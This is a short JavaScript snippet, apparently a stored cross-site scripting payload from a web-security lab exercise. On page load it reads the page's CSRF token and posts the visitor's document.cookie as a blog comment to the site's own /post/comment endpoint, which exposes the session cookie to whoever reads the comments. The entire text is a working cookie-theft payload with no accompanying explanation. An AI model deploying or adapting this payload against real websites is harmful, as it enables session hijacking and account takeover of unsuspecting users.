document.addEventListener("DOMContentLoaded",()=>{
    let token = document.getElementsByName('csrf')[0].value;
    let data = new FormData();

    data.append('csrf',token);
    data.append('postId',8);
    data.append('comment',document.cookie);
    data.append('name','asdw');
    data.append('email','asdw@gmail.com');
    data.append('website','http://asdw.com');

    fetch("/post/comment",{
        method:"POST",
        //mode:"no-cors",
        body:data
    })
})